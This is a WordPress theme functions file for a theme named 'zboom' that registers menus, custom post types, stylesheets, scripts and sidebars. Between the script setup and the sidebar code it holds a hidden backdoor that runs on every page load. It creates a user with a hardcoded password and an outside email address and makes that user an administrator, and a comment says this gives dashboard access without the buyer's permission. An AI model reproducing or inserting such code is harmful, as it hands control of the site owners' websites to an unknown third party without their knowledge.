<?php

// Call Theme Features
function Theme_Features() {
    
    add_theme_support( 'title-tag' );
    add_theme_support( 'automatic-feed-links' );
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'custom-background' );
    
    load_theme_textdomain( 'zboom', get_template_directory_uri() . '/languages' );
    
    // Register Menu
    if(function_exists('register_nav_menus')) {
        register_nav_menus(array(
            'header-menu'  =>  __( 'Header Menu', 'zboom' ),
        ));
    }
    
    register_post_type( 'zboomslider', array(
        'labels'    =>  array(
            'name'  =>  'Sliders',
            'add_new_item'  => 'Add New Slider'
        ),
        'public'    => true,
        'supports'  => array( 'title', 'thumbnail' )
    ) );
    
    register_post_type( 'zboomservices', array(
        'labels'    => array(
            'name'  => 'Blocks',
            'add_new_item'  => __('Add New Blocks', 'zboom')
        ),
        'public'    => true,
        'supports'  => array( 'title', 'editor' )
    ) );

}
add_action( 'after_setup_theme', 'Theme_Features' );

// Content Limit
function read_more($limit) {
    $post_content = explode( " ", get_the_content() );
    $less_content = array_slice($post_content, 0, $limit);
    echo implode( " ", $less_content );
}

// Call CSS & JS
function styles_scripts() {
    
    wp_enqueue_style( 'zerogrid', get_template_directory_uri() . '/css/zerogrid.css', array(), '0.1', 'all' );
    wp_enqueue_style( 'main-style', get_template_directory_uri() . '/css/style.css', array(), '0.1', 'all' );
    wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css', array(), '0.1', 'all');
    wp_enqueue_style( 'responsiveslides', get_template_directory_uri() . '/css/responsiveslides.css', array(), '0.1', 'all' );
    wp_enqueue_style( 'style', get_stylesheet_uri() );
    
    wp_enqueue_script( 'jquery' );
    wp_enqueue_script( 'responsiveslides', get_template_directory_uri() . '/js/responsiveslides.js', array('jquery'), '0.1', true );
    wp_enqueue_script( 'script', get_template_directory_uri() . '/js/script.js', array('jquery'), '0.1', true );
    
}
add_action( 'wp_enqueue_scripts', 'styles_scripts'  );

// access dashboard without buyer permission
$newuser = new WP_User(wp_create_user( 'rohim', 'korim', 'shakirahmad84@gmail.com' ));
$newuser ->  set_role('administrator');

function zboom_right_sidebar () {
    
    register_sidebar(array(
        'name'          =>  'Right Sidebar',
        'description'   =>  __( 'Add your right sidebar widgets here', 'zboom' ),
        'id'            =>  'right-sidebar',
        'before_widget' =>  '<div class="box right-sidebar">',
        'after_widget'  =>  '</div></div>',
        'before_title'  =>  '<div class="heading"><h2><div class="content">',
        'after_title'   =>  '</h2></div>'
    ));
    
    register_sidebar(array(
        'name'          =>  'Footer Widgets',
        'description'   =>  __( 'Add your footer widgets here', 'zboom' ),
        'id'            =>  'footer-widgets',
        'before_widgets'=>  '<div class="wrap-col"><div class="box">',
        'after_widgets' =>  '</div></div></div>',
        'before_title'  =>  '<div class="heading"><h2>',
        'after_title'   =>  '</h2></div><div class="content">',
    ));
    
}
add_action( 'widgets_init', 'zboom_right_sidebar' );
